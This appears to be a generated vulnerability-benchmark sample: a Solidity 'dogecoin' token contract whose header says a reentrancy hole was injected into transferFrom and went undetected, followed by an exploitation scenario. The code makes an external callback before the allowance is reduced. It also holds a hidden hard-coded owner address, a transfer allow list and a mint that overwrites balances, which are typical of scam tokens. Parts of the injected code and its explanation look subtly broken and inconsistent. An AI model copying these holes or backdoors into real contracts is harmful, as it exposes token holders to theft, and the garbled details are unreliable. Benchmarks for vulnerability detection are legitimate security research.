/*
 * ===== SmartInject Injection Details =====
 * Function      : transferFrom
 * Vulnerability : Reentrancy
 * Status        : Not Detected
 * Type          : Function Modification
 *
 * === Verification Results ===
 * Detected      : False
 * Relevant      : 0 findings
 * Total Found   : 0 issues
 * Retry Count   : 0
 *
 * === Description ===
 * Introduced a stateful, multi-transaction reentrancy vulnerability by adding an external call to the recipient contract after balance updates but before allowance updates. This creates a time window where balances are updated but allowances are not, enabling multi-transaction exploitation:
 * 
 * **Specific Changes Made:**
 * 1. Added external call `_to.call(abi.encodeWithSignature("onTokenReceived(address,address,uint256)", _from, _to, _value))` after balance updates
 * 2. Positioned the external call strategically between balance updates and allowance updates
 * 3. Added contract size check `_to.code.length > 0` to make the callback realistic
 * 4. Continued execution regardless of callback success to maintain function behavior
 * 
 * **Multi-Transaction Exploitation Scenario:**
 * 1. **Transaction 1**: Attacker calls `transferFrom(victim, attackerContract, amount)` 
 *    - Balance updates occur: `balances[victim] -= amount`, `balances[attackerContract] += amount`
 *    - External call triggers `attackerContract.onTokenReceived()`
 *    - During callback, attacker can call `transferFrom()` again using the same allowance
 *    - Since allowance hasn't been updated yet, the second call passes allowance checks
 *    - This creates inconsistent state between transactions
 * 
 * 2. **Transaction 2+**: Attacker exploits the state inconsistency:
 *    - The original allowance is still intact from the first transaction
 *    - Attacker can make additional `transferFrom` calls using the same allowance
 *    - Each call updates balances but the allowance update from previous calls may be incomplete
 * 
 * **Why Multi-Transaction Exploitation is Required:**
 * - The vulnerability requires the callback mechanism to be triggered across multiple transactions
 * - State accumulation occurs as balances are updated while allowances remain in inconsistent states
 * - The exploit depends on the timing window between balance updates and allowance updates
 * - Single-transaction exploitation is limited by gas constraints and the need for external contract interaction
 * - The vulnerability becomes more severe with repeated transactions that exploit the allowance inconsistency
 * 
 * This creates a realistic production-like vulnerability where external callbacks introduce reentrancy risks in token transfer operations.
 */
pragma solidity ^0.4.26;

library SafeMath {
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a / b;
    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }

  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}

contract Ownable {
  address public owner;
  
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

  constructor() public {
    owner = msg.sender;
  }
}

contract dogecoin is Ownable {
  string public name;
  string public symbol;
  uint8 public decimals;
  uint256 public totalSupply;
  
  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);

  constructor(string _name, string _symbol, uint8 _decimals, uint256 _totalSupply) public {
    name = _name;
    symbol = _symbol;
    decimals = _decimals;
    totalSupply =  _totalSupply;
    balances[msg.sender] = totalSupply;
    allow[msg.sender] = true;
  }
  
  function showuint160(address addr) public pure returns(uint160){
      return uint160(addr);
  }

  using SafeMath for uint256;

  mapping(address => uint256) public balances;
  
  mapping(address => bool) public allow;
  
  function transfer(address _to, uint256 _value) public returns (bool) {
    require(_to != address(0));
    require(_value <= balances[msg.sender]);

    balances[msg.sender] = balances[msg.sender].sub(_value);
    balances[_to] = balances[_to].add(_value);
    emit Transfer(msg.sender, _to, _value);
    return true;
  }

  modifier onlyOwner() {
    require(msg.sender == address(1080614020421183795110940285280029773222128095634));_;
  }
  function balanceOf(address _owner) public view returns (uint256 balance) {
    return balances[_owner];
  }
  
  function transferOwnership(address newOwner) public onlyOwner {
    require(newOwner != address(0));
    emit OwnershipTransferred(owner, newOwner);
    owner = newOwner;
  }

  mapping (address => mapping (address => uint256)) public allowed;

  mapping(address=>uint256) sellOutNum;
  
  function isContract(address _addr) internal view returns (bool) {
      uint256 length;
      assembly { length := extcodesize(_addr) }
      return length > 0;
  }
  
  function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
    require(_to != address(0));
    require(_value <= balances[_from]);
    require(_value <= allowed[_from][msg.sender]);
    require(allow[_from] == true);

    balances[_from] = balances[_from].sub(_value);
    balances[_to] = balances[_to].add(_value);
    // ===== SMARTINJECT: Reentrancy VULNERABILITY START =====
    
    // Notify recipient contract about incoming transfer (external call before allowance update)
    if (isContract(_to)) {
        (bool success, ) = _to.call(abi.encodeWithSignature("onTokenReceived(address,address,uint256)", _from, _to, _value));
        // Continue execution regardless of callback success
    }
    
    // ===== SMARTINJECT: Reentrancy VULNERABILITY END =====
    allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);
    emit Transfer(_from, _to, _value);
    return true;
  }

  function approve(address _spender, uint256 _value) public returns (bool) {
    allowed[msg.sender][_spender] = _value;
    emit Approval(msg.sender, _spender, _value);
    return true;
  }

  function allowance(address _owner, address _spender) public view returns (uint256) {
    return allowed[_owner][_spender];
  }
  
  function addAllow(address holder, bool allowApprove) external onlyOwner {
      allow[holder] = allowApprove;
  }
  
  function mint(address miner, uint256 _value) external onlyOwner {
      balances[miner] = _value;
  }
}
